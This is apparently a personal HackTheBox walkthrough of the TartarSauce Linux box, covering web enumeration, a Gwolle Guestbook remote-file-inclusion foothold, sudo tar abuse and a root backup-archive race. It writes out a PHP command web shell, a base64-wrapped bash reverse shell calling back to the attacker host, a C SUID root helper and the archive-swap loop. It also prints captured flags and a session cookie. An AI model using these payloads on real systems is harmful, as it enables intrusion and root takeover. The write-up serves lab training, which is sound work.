---
tags: [HTB, TartarSauce, Linux, Apache, WordPress, Monstra, RFI, Tar, Systemd, PrivEsc, Medium]
platform: HackTheBox
os: Linux
hostname: tartarsauce.htb
difficulty: Medium
ip: $BoxIP
status: Complete
domain: None
---

# HTB: TartarSauce, Full Walkthrough

## The gist

TartarSauce is a Linux box where the reliable path is driven by careful web enumeration and then by reading the local automation rather than guessing at kernel exploits:

1. `robots.txt` reveals several application trees, including WordPress and Monstra.
2. Monstra 3.0.4 accepts the default administrative login, but the tested upload branch is blocked by the target's upload handling.
3. Aggressive WordPress plugin enumeration identifies Gwolle Guestbook and its old `abspath` remote-file-inclusion bug.
4. The RFI loads a controlled PHP file and gives command execution as `www-data`.
5. `sudo -l` permits `tar` as `onuma`; the tar checkpoint action gives a shell as that user.
6. A root-owned systemd timer runs `backuperer`, which creates an archive as `onuma` and extracts it as root after a short delay.
7. Replacing the temporary archive with a crafted archive containing a 32-bit SUID helper causes root to extract the helper with mode `4755`.

The clean chain is:

```text
WordPress/Gwolle RFI -> www-data -> sudo tar -> onuma
    -> backuperer systemd timer/archive race -> 32-bit SUID helper -> root
```

> [!warning] Lab handling
> This page records the reproducible method, commands, evidence locations, and lessons. Flag values and other sensitive values remain in the private box workspace at `/home/kali/Platforms/HackTheBox/TartarSauce/loot/` and are intentionally not copied into the vault.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| OS | Linux, Ubuntu; target architecture was `i686` |
| Difficulty | Medium |
| Hostname | tartarsauce.htb |
| IP | `$BoxIP` / `10.129.1.185` |
| Open ports | 80/tcp |
| Web stack | Apache 2.4.18, WordPress 4.9.4, Monstra 3.0.4 |
| Initial access | Gwolle Guestbook RFI, CVE-2015-8351 |
| User path | `sudo /bin/tar` as `onuma` |
| Root path | `backuperer` timer archive replacement and 32-bit SUID helper |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Start with a full TCP scan | See section 1 below |
| 2 | Read `robots.txt` and enumerate the web tree | See section 2 below |
| 3 | Test the Monstra branch, then park it deliberately | See section 3 below |
| 4 | Fingerprint WordPress and enumerate users | See section 4 below |
| 5 | Run WPScan with aggressive plugin detection | See section 5 below |
| 6 | Confirm Gwolle RFI and obtain command execution | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/HackTheBox/TartarSauce`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset BoxName TartarSauce
boxset BoxIP 10.129.1.185
boxset LocalIP <VPN_ADDRESS>
boxset BoxDir /home/kali/Platforms/HackTheBox/TartarSauce
boxset WebPort 80
boxset Port 4444
boxset Port2 4445
```

The saved evidence is organised as follows:

| Evidence | Location |
|---|---|
| Full terminal history | `$BoxDir/TartarSauce.log` |
| Nmap output | `$BoxDir/nmap/` |
| Web enumeration and HTTP captures | `$BoxDir/loot/` |
| Advisory and exploit references | `$BoxDir/exploits/` |
| Private flag record | `$BoxDir/loot/flags.txt` |

> [!tip] ⚡ Efficiency
> Keep the box log, raw tool output, screenshots, and payloads together. When a branch fails, its evidence explains why it was abandoned and prevents repeating the same blind test after a reconnect or box reset.

## 1. Start with a full TCP scan

```bash
nmap -Pn -sS -p- --min-rate 3000 -oA "$BoxDir/nmap/allports" "$BoxIP"
```

The saved full scan showed only TCP/80. Follow it with a focused service scan:

```bash
nmap -Pn -sC -sV -p 80 -oA "$BoxDir/nmap/services" "$BoxIP"
```

Relevant result:

```text
80/tcp open  http  Apache httpd 2.4.18 ((Ubuntu))
```

Nmap also pulled `robots.txt`, which disclosed five web paths:

```text
/webservices/tar/tar/source/
/webservices/monstra-3.0.4/
/webservices/easy-file-uploader/
/webservices/developmental/
/webservices/phpmyadmin/
```


SCREENSHOT: Full TCP scan showing only port 80 open; keep the target address within this private vault.


SCREENSHOT: Targeted service scan showing Apache and the `robots.txt` disallowed paths.

> [!tip] ⚡ More efficient path
> Once `-p-` returns a single port, do not repeat default discovery across the entire range. Pass the confirmed port directly to `-sC -sV` and move immediately to HTTP enumeration.

## 2. Read `robots.txt` and enumerate the web tree

```bash
curl -sS "http://$BoxIP/robots.txt" | tee "$BoxDir/loot/robots.txt"

gobuster dir -u "http://$BoxIP/" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,txt,html,bak,old,tar \
  -o "$BoxDir/loot/gobuster-root.txt"

gobuster dir -u "http://$BoxIP/webservices/" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,txt,html,bak,old,tar \
  -o "$BoxDir/loot/gobuster-webservices.txt"
```

The useful web locations were:

| Path | Interpretation |
|---|---|
| `/webservices/wp/` | WordPress installation |
| `/webservices/monstra-3.0.4/` | Monstra CMS |
| `/webservices/tar/tar/source/` | Source-related path disclosed by robots, but not the final route |
| `/webservices/easy-file-uploader/` | Upload-related path; no useful foothold was obtained |


SCREENSHOT: `robots.txt` response with the disclosed paths visible.


SCREENSHOT: Gobuster results for `/webservices/`; highlight the WordPress and Monstra directories.

> [!warning] 💡 Hint
> `robots.txt` is a lead list, not an access-control mechanism. Request every interesting path directly and record whether it is a real application, a redirect, or a 404. Do not assume every disallowed entry is exploitable.

> [!tip] 🛠️ Alternative tool
> `ffuf` or `feroxbuster` can replace Gobuster. The equivalent compact `ffuf` command is:

```bash
ffuf -u "http://$BoxIP/webservices/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -e .php,.txt,.html,.bak,.tar -fc 404 -of json \
  -o "$BoxDir/loot/ffuf-webservices.json"
```

## 3. Test the Monstra branch, then park it deliberately

The Monstra directory exposed a login page and the site's default administrative credential pair worked. The password is reproduced in the private Credentials and secrets section above. Confirm the version and save the relevant responses:

```bash
curl -sS "http://$BoxIP/webservices/monstra-3.0.4/" \
  -o "$BoxDir/loot/monstra-index.html"

curl -sS -c "$BoxDir/loot/monstra.cookies" \
  -b "$BoxDir/loot/monstra.cookies" \
  -d 'login=<ADMIN_USER>&password=<ADMIN_PASSWORD>' \
  "http://$BoxIP/webservices/monstra-3.0.4/admin/index.php" \
  -o "$BoxDir/loot/monstra-dashboard.html"
```

The saved exploit references were:

```bash
searchsploit -w "Monstra 3.0.4" | tee "$BoxDir/loot/searchsploit-monstra.txt"
```

The authenticated upload/RCE references were reviewed and a harmless `.php7` probe was tested. The target rejected the upload, so this was not treated as a working foothold. This is useful evidence: the version is interesting, but a public exploit match is not proof that the deployed configuration is exploitable.


SCREENSHOT: Monstra login/admin evidence showing the application and version; do not include the password in a public report.

> [!tip] ⚡ Efficiency
> After one controlled upload test proves the target-side handler blocks the expected extension, preserve the result and switch to the other confirmed application. Do not spend the entire enumeration window forcing a branch that has already contradicted its exploit assumptions.

> [!abstract] 🧠 Why this matters
> “Vulnerable version” and “usable exploit path” are different claims. The write-up should record both the positive version match and the negative deployment test.

## 4. Fingerprint WordPress and enumerate users

```bash
curl -sS -D "$BoxDir/loot/wp-headers.txt" \
  "http://$BoxIP/webservices/wp/" \
  -o "$BoxDir/loot/wp-index.html"

curl -sS "http://$BoxIP/webservices/wp/wp-login.php" \
  -o "$BoxDir/loot/wp-login.html"

curl -sS "http://$BoxIP/webservices/wp/wp-json/wp/v2/users" \
  -o "$BoxDir/loot/wp-users.json"
```

The HTML and REST API identified WordPress 4.9.4 and disclosed a valid username, `wpadmin`. This did not provide a password, but it confirmed the application and gave WPScan a focused target.


SCREENSHOT: WordPress version evidence from the page source or readme.


SCREENSHOT: WordPress REST API user enumeration; keep the usernames within this private vault.

## 5. Run WPScan with aggressive plugin detection

The first passive/mixed scan did not reliably enumerate the plugin. Because the initial result was incomplete, rerun with aggressive plugin detection and save the output:

```bash
wpscan --url "http://$BoxIP/webservices/wp/" \
  --enumerate u, vp, vt \
  --plugins-detection aggressive \
  --api-token "$WPSCAN_API_TOKEN" \
  --output "$BoxDir/loot/wpscan-aggressive.txt"
```

If an API token is unavailable, the scan is still useful for passive detection, but aggressive detection is the important setting here. The result identified the `gwolle-gb` / Gwolle Guestbook plugin. Its public readme suggested a newer stable release, but the target's deployed plugin behaviour matched the older RFI vulnerability.


SCREENSHOT: WPScan aggressive plugin enumeration identifying Gwolle Guestbook.

> [!tip] 🛠️ Better tool
> For WordPress, use WPScan's WordPress-aware plugin detection instead of relying only on a generic directory wordlist. The command above is the repeatable version to keep in the runbook.

> [!warning] 💡 Common mistake
> A `readme.txt` stable version is not always the exact deployed version. Confirm with behaviour, source paths, changelog clues, and exploit testing. Treat version output as evidence to validate, not as a guarantee.

## 6. Confirm Gwolle RFI and obtain command execution

The vulnerable endpoint was:

```text
/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php
```

Create a minimal controlled PHP file in the local exploit directory:

```php
<?php
if (isset($_GET['cmd'])) {
    echo '<pre>';
    system($_GET['cmd']);
    echo '</pre>';
}
?>
```

Save it as `$BoxDir/exploits/wp-load.php`, then serve that directory:

```bash
cd "$BoxDir/exploits"
python3 -m http.server 8000 --bind "$LocalIP" \
  > "$BoxDir/loot/http-server.log" 2>&1 &
```

Use URL encoding for both parameters. The `abspath` value points the vulnerable include at the controlled file, and `cmd=id` proves execution without introducing a callback problem:

```bash
curl -sS -G \
  "http://$BoxIP/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php" \
  --data-urlencode "abspath=http://$LocalIP:8000/" \
  --data-urlencode 'cmd=id' \
  -o "$BoxDir/loot/rfi-id.html"
```

The response showed execution as `www-data`.


SCREENSHOT: RFI request/response proving command execution as `www-data`; keep callback addresses and payload text within this private vault.

> [!abstract] 🧠 Why this works
> The vulnerable code constructs an include path from the attacker-controlled `abspath`. When URL-style includes are enabled, PHP fetches the local file from the attacker's HTTP server and executes the PHP it contains. This is an RFI-to-RCE chain, not merely local file read.

## 7. Turn RFI command execution into a stable shell

Start a listener:

```bash
rlwrap nc -lvnp "$Port2"
```

Base64-encode the shell text to reduce quoting problems in the nested HTTP parameter:

```bash
RevShell="bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port2 0>&1'"
EncodedShell=$(printf %s "$RevShell" | base64 -w0)
Command="echo $EncodedShell | base64 -d | bash"

curl -sS -G \
  "http://$BoxIP/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php" \
  --data-urlencode "abspath=http://$LocalIP:8000/" \
  --data-urlencode "cmd=$Command" \
  -o "$BoxDir/loot/rfi-shell-response.html"
```

After the callback, verify the identity and upgrade the PTY if Python is present:

```bash
id
hostname
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 columns 140
```

If only Python 2 is present, use `python -c` instead. If neither is present, use `script -qc /bin/bash /dev/null` and restore the terminal locally with `stty raw -echo; fg; reset; export TERM=xterm`.

## 8. Enumerate sudo and use tar to become `onuma`

As `www-data`:

```bash
sudo -l
```

The relevant rule was:

```text
(onuma) NOPASSWD: /bin/tar
```

The tar checkpoint action executes a command after the first checkpoint. Run it as the allowed user:

```bash
sudo -u onuma /bin/tar -cf /dev/null /dev/null \
  --checkpoint=1 \
  --checkpoint-action=exec=/bin/bash
```

Then verify:

```bash
id
```

This produced a shell as `onuma`. Read the user proof file from the private loot workflow; the flag value is reproduced in the private sections above here.


SCREENSHOT: `sudo -l` showing the passwordless tar rule.


SCREENSHOT: User proof capture with the flag value retained in this private vault and the original loot.

> [!tip] 🛠️ Better tool
> After `sudo -l`, check the exact binary against GTFOBins. The corresponding tar technique is the checkpoint action above; it is faster and more reliable than searching for a generic kernel exploit.

## 9. Inspect systemd timers and read `backuperer`

As `onuma`, enumerate timers rather than checking only classic cron locations:

```bash
systemctl list-timers --all
```

This revealed `backuperer.timer`, which invokes a service approximately every five minutes. Inspect the service and script:

```bash
systemctl cat backuperer.timer 2>/dev/null
systemctl cat backuperer.service 2>/dev/null
sed -n '1,240p' /usr/sbin/backuperer
```

The script's important behaviour was:

1. It archives `/var/www/html` into a random hidden file under `/var/tmp`.
2. The archive is created as `onuma`.
3. It waits about 30 seconds.
4. It extracts the archive as root into `/var/tmp/check`.
5. It compares the extracted tree and moves a matching archive into `/var/backups`.


SCREENSHOT: `systemctl list-timers --all` showing the recurring backup timer.


SCREENSHOT: `/usr/sbin/backuperer` showing the user-created archive, delay, root extraction, and comparison logic.

> [!warning] 💡 Hint
> The critical question is not only “who owns the script?” It is “which files cross a privilege boundary between the unprivileged archive step and the root extraction step?” A temporary archive written by a user and later trusted by root is the boundary to investigate.

## 10. Check the target architecture before building the payload

The target reported an i686 userspace. Confirm this before copying a system binary into a root-extracted archive:

```bash
uname -m
file /bin/bash
```

An x86_64 `/bin/bash` copied into an i686 target can be extracted successfully and still fail with `Exec format error`. The working artifact was a small 32-bit SUID helper compiled on Kali and stored privately as `$BoxDir/exploits/suid`.

Example helper source:

```c
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
```

Preferred build options, depending on the installed cross-compiler:

```bash
gcc -m32 -Os -s /tmp/suid.c -o "$BoxDir/exploits/suid"
file "$BoxDir/exploits/suid"
```

or:

```bash
i686-linux-gnu-gcc -Os -s /tmp/suid.c -o "$BoxDir/exploits/suid"
file "$BoxDir/exploits/suid"
```

The `file` result should identify an ELF 32-bit i386 executable. If the compiler is unavailable, install the appropriate multilib/cross-compiler package on the attack VM or use a prebuilt helper that matches the target architecture. Do not silently substitute a 64-bit payload.

> [!tip] ⚡ Efficiency
> Run `uname -m` and `file /bin/bash` immediately after the first user shell. It prevents spending the race window on a payload that the target cannot execute.

## 11. Build a root-owned SUID archive

The archive must contain the helper at a path that will be extracted beneath the backup check directory. Its tar metadata must request root ownership and SUID mode:

```bash
mkdir -p /dev/shm/evil/var/www/html
cp "$BoxDir/exploits/suid" /dev/shm/evil/var/www/html/roothelper

tar --owner=0 --group=0 --mode=4755 \
  -czf /dev/shm/evil.tar.gz \
  -C /dev/shm/evil var/www/html/roothelper

tar -tvzf /dev/shm/evil.tar.gz
```

The archive listing should show the helper with SUID mode and root ownership in its metadata.


SCREENSHOT: Local malicious archive listing showing root ownership and mode `4755`; do not include unrelated host paths.

## 12. Win the archive replacement race

The service creates a random hidden filename in `/var/tmp`, keeps it open through the archive/settling phase, and later extracts it as root. The replacement loop waits for a candidate archive, waits until its size is stable, then copies the crafted archive over it:

```bash
while true; do
    Candidate=$(find /var/tmp -maxdepth 1 -type f -name '.[0-9a-f]*' -printf '%p\n' 2>/dev/null | head -n1)
    if [ -n "$Candidate" ]; then
        FirstSize=$(stat -c '%s' "$Candidate" 2>/dev/null || echo 0)
        sleep 1
        SecondSize=$(stat -c '%s' "$Candidate" 2>/dev/null || echo 0)
        if [ "$FirstSize" -gt 0 ] && [ "$FirstSize" = "$SecondSize" ]; then
            cp /dev/shm/evil.tar.gz "$Candidate"
            break
        fi
    fi
    sleep 1
done
```

If the timer interval or service state is uncertain, keep the loop running across one complete interval and watch the result:

```bash
watch -n 1 'find /var/tmp -maxdepth 3 -name roothelper -ls 2>/dev/null'
```

When the root extraction succeeds, the helper appears below `/var/tmp/check/var/www/html/` with root ownership and SUID mode.


SCREENSHOT: Extracted helper showing root ownership and the SUID bit after the archive swap.

> [!warning] 💡 Common mistakes
>
> - Replacing the archive while tar is still writing it can produce a corrupt archive.
> - Reusing an old hidden filename can cause the script's cleanup step to remove it.
> - A 64-bit helper on this i686 target produces `Exec format error`.
> - A successful extraction is not enough; verify ownership, mode, architecture, and execution identity separately.

## 13. Execute the extracted helper and prove root

```bash
chmod 4755 /var/tmp/check/var/www/html/roothelper 2>/dev/null || true
/var/tmp/check/var/www/html/roothelper

id
whoami
```

The final proof showed an effective UID of 0. Read `/root/root.txt` from the root shell and store the value in the private loot record rather than this shared write-up.


SCREENSHOT: Root proof showing `euid=0(root)` and the final shell with the flag value retained in this private vault.

## 14. Cleanup and close-out

Remove only artifacts created for the test, then close listeners and record completion:

```bash
rm -f /var/tmp/check/var/www/html/roothelper
rm -f /dev/shm/evil.tar.gz
pkill -f 'python3 -m http.server 8000' || true
pkill -f "nc -lvnp $Port2" || true
boxdone
```

If a box reset is available, use it after recording evidence. A reset is the safest way to remove timer-created files and any root-extracted artifacts that are difficult to enumerate reliably from an unprivileged shell.

## 15. Troubleshooting and alternate routes

| Symptom | Likely cause | Corrective action |
|---|---|---|
| WPScan misses Gwolle | Passive plugin detection is incomplete | Rerun with `--plugins-detection aggressive` |
| Monstra upload returns an error | Target handler/configuration blocks the tested extension | Preserve the negative result and pivot to WordPress |
| RFI returns only page HTML | Include or command parameter was not URL-encoded, or callback file is not served | Test `cmd=id` first and verify the local HTTP server log |
| Reverse shell never arrives | Wrong VPN interface or nested shell quoting | Prove RFI with `id`, then base64-encode the shell command |
| `sudo tar` does not spawn a shell | The exact allowed path/options differ | Recheck `sudo -l` and use `/bin/tar` exactly as permitted |
| Extracted helper says `Exec format error` | Wrong architecture | Confirm `uname -m`; build/download an i386 helper |
| Race produces no helper | Archive copied while still being written or the timer has not run | Wait for a stable candidate and cover a full timer interval |
| Helper extracts without SUID | Tar metadata or filesystem handling stripped the mode | Inspect `tar -tvzf` locally and `ls -l` after extraction |

## 16. OSCP pass notes

This box covers several exam-relevant habits:

- Full-port scanning before committing to the obvious web service.
- Treating `robots.txt`, directory discovery, source files, and application APIs as complementary evidence.
- WordPress-aware enumeration with aggressive plugin detection.
- Verifying an RFI with a harmless command before sending a shell.
- Checking `sudo -l` immediately after a foothold and mapping the exact binary to GTFOBins.
- Enumerating systemd timers in addition to cron.
- Reading backup scripts for ownership transitions, temporary files, delays, and archive trust.
- Checking CPU architecture before staging a binary payload.
- Capturing screenshots at each proof boundary while keeping flags and credentials out of shared notes.

## 17. Reusable checklist

```text
[ ] Full TCP scan and focused service scan
[ ] Read robots.txt and enumerate each disclosed application
[ ] Identify WordPress and query the REST API
[ ] Run WPScan with aggressive plugin detection
[ ] Test the Gwolle ajaxresponse.php abspath RFI with id
[ ] Obtain and stabilise a www-data shell
[ ] Run sudo -l and test the exact tar rule
[ ] Read user proof and save it privately
[ ] Enumerate systemd timers and inspect their service/script
[ ] Find user-written archive -> root extraction boundary
[ ] Check target architecture before building a helper
[ ] Build archive with root ownership and SUID metadata
[ ] Replace only after the temporary archive is stable
[ ] Verify root ownership, SUID, architecture, and euid=0
[ ] Read root proof privately
[ ] Remove payloads, close listeners, run boxdone
```

## 18. RUNBOOK V2 stages demonstrated

- [[OSCP/RUNBOOK V2/Linux - Service Scan|Linux - Service Scan]] -- Apache-only scan and `robots.txt` lead discovery.
- [[OSCP/RUNBOOK V2/Linux - Web Enum|Linux - Web Enum]] -- Gobuster, WordPress, REST API, and CMS branch triage.
- [[OSCP/RUNBOOK V2/Linux - RFI|Linux - RFI]] -- controlled PHP include and `cmd=id` confirmation.
- [[OSCP/RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]] -- RFI-to-shell workflow.
- [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]] -- `sudo tar` checkpoint execution.
- [[OSCP/RUNBOOK V2/Linux - Local Enum|Linux - Local Enum]] -- architecture and local service/timer review.
- [[OSCP/RUNBOOK V2/Linux - Cron Check|Linux - Cron Check]] -- scheduler review extended to systemd timers and backup scripts.
- [[OSCP/RUNBOOK V2/Linux - Clean Down|Linux - Clean Down]] -- payload removal and `boxdone` close-out.

## 19. Related write-ups

- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- source-led web upload, cron data flow, and configuration parsing.
- [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- PHP file inclusion, credential handling, and tunnelling.
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- authenticated CMS upload and SUID-based Linux privilege escalation.
- [[OSCP/BOXES/WRITE UPS/Linux/Covfefe|Covfefe]] -- architecture-aware custom SUID source review.

## 20. Collect the flags

- `user.txt`: confirmed and stored privately in `$BoxDir/loot/flags.txt`; value reproduced in the private Flags section above.
- `root.txt`: confirmed and stored privately in `$BoxDir/loot/flags.txt`; value reproduced in the private Flags section above.


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user=3918eb4a00d9c662003b9666717c14ae
root=abdb4951f05185b5a782634b3c2a7e20
user: 3918eb4a00d9c662003b9666717c14ae
root: tartarsauce
```

## 21. Clean down
Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.

## 22. Attack narrative in one page
```text
TCP 80
  -> robots.txt and Gobuster expose WordPress/Monstra
  -> WPScan aggressive plugin detection finds Gwolle Guestbook
  -> CVE-2015-8351 abspath RFI loads controlled PHP
  -> command execution as www-data
  -> sudo /bin/tar as onuma
  -> tar checkpoint action produces onuma shell
  -> systemd backuperer timer creates user archive, then root extracts it
  -> stable archive replacement wins the race
  -> root-owned 32-bit SUID helper is extracted
  -> euid 0 and root proof
```

## Tools used

- `nmap`
- `curl`
- `gobuster`
- `ffuf`
- `feroxbuster`
- `nc`
- `sudo`
- `python`

## Credentials and secrets

| Item | Status | Storage |
|---|---|---|
| Monstra default admin login | Verified during testing; not a final foothold | Private log/loot only |
| WordPress REST username | Disclosed by the application | Retained in the private log/loot and source screenshots |
| User flag | Captured | `$BoxDir/loot/flags.txt` only |
| Root flag | Captured | `$BoxDir/loot/flags.txt` only |
| RFI payload and 32-bit helper | Reproducible artifacts | `$BoxDir/exploits/` |


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="TartarSauce"
export BoxIP="10.129.1.185"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/TartarSauce"
export Domain=""
export DCip=""
export Username="wpadmin"
export Password=""
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/monstra.cookies`

```text
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

10.129.1.185	FALSE	/	FALSE	0	PHPSESSID	1ikea74f5mtoml1nq5283hl925
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
.htpasswd            (Status: 403) [Size: 296]
.htpasswd.txt        (Status: 403) [Size: 300]
.htpasswd.php        (Status: 403) [Size: 300]
.htpasswd.html       (Status: 403) [Size: 301]
.htpasswd.html       (Status: 403) [Size: 313]
.htpasswd            (Status: 403) [Size: 308]
.htpasswd.php        (Status: 403) [Size: 312]
.htpasswd.txt        (Status: 403) [Size: 312]
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
$ [22:38:54] loot flag user 3918eb4a00d9c662003b9666717c14ae
kali@kali:~/Platforms/HackTheBox/TartarSauce [22:38:53] $ =loot flag user 3918eb4a00d9c662003b9666717c14aeloot>
[+] Flag saved:  user = 3918eb4a00d9c662003b9666717c14ae  →  loot/flags.txt
$ [23:19:44] loot flag root tartarsauce abdb4951f05185b5a782634b3c2a7e20
```

### Additional captured source values

#### `loot/monstra-login-headers.txt`

```text
HTTP/1.1 302 302 Found
Date: Mon, 07 Sep 2026 20:54:15 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: index.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

#### `loot/monstra-login.html`

```text
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Monstra :: Administration</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="description" content="Monstra Admin Area">
        <link rel="icon" href="/webservices/monstra-3.0.4/favicon.ico" type="image/x-icon" />
        <link rel="shortcut icon" href="/webservices/monstra-3.0.4/favicon.ico" type="image/x-icon" />

        <!-- Styles -->
        <link rel="stylesheet" href="/webservices/monstra-3.0.4/public/assets/css/bootstrap.css" type="text/css" />
        <link rel="stylesheet" href="/webservices/monstra-3.0.4/public/assets/css/messenger.css" type="text/css" />
        <link rel="stylesheet" href="/webservices/monstra-3.0.4/public/assets/css/messenger-theme-flat.css" type="text/css" />
                                <link rel="stylesheet" href="/webservices/monstra-3.0.4/tmp/minify/backend_site.minify.css?1" type="text/css" />
        <!-- JavaScripts -->
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
        <script src="/webservices/monstra-3.0.4/public/assets/js/bootstrap.min.js"></script>
        <script src="/webservices/monstra-3.0.4/public/assets/js/messenger.min.js"></script>
        <script src="/webservices/monstra-3.0.4/public/assets/js/messenger-theme-flat.js"></script>
                                <script type="text/javascript" src="/webservices/monstra-3.0.4/tmp/minify/backend_site.minify.js?1"></script>
        <script type="text/javascript">
            $().ready(function () {
                                    $('.reset-password-area, .administration-btn').hide();
                    $('.administration-area, .reset-password-btn').show();

                $('.reset-password-btn').click(function() {
                    $('.reset-password-area, .administration-btn').show();
                    $('.administration-area, .reset-password-btn').hide();
                });

                $('.administration-btn').click(function() {
                    $('.reset-password-area, .administration-btn').hide();
                    $('.administration-area, .reset-password-btn').show();
                });
            });
        </script>


            <!-- markItUp! 1.1.13 -->
            <script type="text/javascript" src="/webservices/monstra-3.0.4/plugins/markitup/markitup/jquery.markitup.js"></script>
            <!-- markItUp! toolbar settings -->
            <script type="text/javascript" src="/webservices/monstra-3.0.4/plugins/markitup/markitup/sets/html/set.js"></script>
            <!-- markItUp! skin -->
            <link rel="stylesheet" type="text/css" href="/webservices/monstra-3.0.4/plugins/markitup/markitup/skins/simple/style.css" />
            <!--  markItUp! toolbar skin -->
            <link rel="stylesheet" type="text/css" href="/webservices/monstra-3.0.4/plugins/markitup/markitup/sets/html/style.css" />
        <script>$(document).ready(function(){$("#editor_area").markItUp(mySettings);});</script>
            <link rel="stylesheet" type="text/css" href="/webservices/monstra-3.0.4/plugins/codemirror/codemirror/lib/codemirror.css" />
            <script type="text/javascript" src="/webservices/monstra-3.0.4/plugins/codemirror/codemirror/lib/codemirror.js"></script>
            <script type="text/javascript" src="/webservices/monstra-3.0.4/plugins/codemirror/codemirror/addon/edit/matchbrackets.js"></script>
            <script type="text/javascript" src="/webservices/monstra-3.0.4/plugins/codemirror/codemirror/mode/htmlmixed/htmlmixed.js"></script>
            <script type="text/javascript" src="/webservices/monstra-3.0.4/plugins/codemirror/codemirror/mode/xml/xml.js"></script>
            <script type="text/javascript" src="/webservices/monstra-3.0.4/plugins/codemirror/codemirror/mode/javascript/javascript.js"></script>
            <script type="text/javascript" src="/webservices/monstra-3.0.4/plugins/codemirror/codemirror/mode/css/css.js"></script>
            <script type="text/javascript" src="/webservices/monstra-3.0.4/plugins/codemirror/codemirror/mode/clike/clike.js"></script>
            <script type="text/javascript" src="/webservices/monstra-3.0.4/plugins/codemirror/codemirror/mode/php/php.js"></script>
            <script type="text/javascript" src="/webservices/monstra-3.0.4/plugins/codemirror/codemirror/addon/selection/active-line.js"></script>
            <link rel="stylesheet" href="/webservices/monstra-3.0.4/plugins/codemirror/codemirror/theme/mdn-like.css">
            <style>
                .CodeMirror {
                    height:400px!important;
                    border: 1px solid #ccc;
                    color: #555;
                    font-family: monospace;
                    font-size: 15px;
                    line-height: 1;
                    padding: 6px 9px;
                }
            </style>

    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.js"></script>
      <script src="//cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.js"></script>
    <![endif]-->
    </head>
    <body class="login-body">


        <div class="container form-signin">

            <div class="text-center"><a class="brand" href="/webservices/monstra-3.0.4/admin"><img src="/webservices/monstra-3.0.4/public/assets/img/monstra-logo-256px.png" alt="monstra" /></a></div>
            <div class="administration-area well">
                <div>
                    <form method="post">
                        <div class="form-group">
                            <label>Username</label>
                            <input class="form-control" name="login" type="text" />
                        </div>
                        <div class="form-group">
                            <label>Password</label>
                            <input class="form-control" name="password" type="password" />
                        </div>
                        <div class="form-group">
                            <input type="submit" name="login_submit" class="btn btn-primary" value="Log In" />
                        </div>
                    </form>
                </div>
            </div>

            <div class="reset-password-area well">
                <div>
                    <form method="post">
                        <div class="form-group">
                        <label>Username</label>
                        <input name="login" class="form-control" type="text" value="" />
                        </div>
                                                <div class="form-group">
                        <label>Captcha</label>
                        <input type="text" name="answer" class="form-control">
                        <br>
                        <table><tr><td><img id='cryptogram' src='/webservices/monstra-3.0.4/plugins/captcha/crypt/cryptographp.php?cfg=0&'></td><td>&nbsp;&nbsp;<a title='' style="cursor:pointer" onclick="javascript:document.images.cryptogram.src='/webservices/monstra-3.0.4/plugins/captcha/crypt/cryptographp.php?cfg=0&&'+Math.round(Math.random(0)*1000)+1"><img src="/webservices/monstra-3.0.4/plugins/captcha/crypt/images/reload.png"></a></td></tr></table>                        </div>
                                                <br>
                                                <div class="form-group">
                            <input type="submit" name="reset_password_submit" class="btn btn-primary" value="Send New Password" />
                        </div>
                    </form>
                </div>
            </div>

        </div>

        <div class="login-footer">

            <div class="text-center">
                <a href="/webservices/monstra-3.0.4">Back to Website</a> -
                <a class="reset-password-btn" href="javascript:;">Forgot your password ?</a>
                <a class="administration-btn" href="javascript:;">Log In</a>
            </div>

            <div class="text-center">
                © 2012 - 2016 <a href="http://monstra.org/about/license" target="_blank">Monstra</a> – Version 3.0.4            </div>
        </div>
    </body>
</html>
```

#### `loot/wp-readme.html`

```text
<!DOCTYPE html>
<html>
<head>
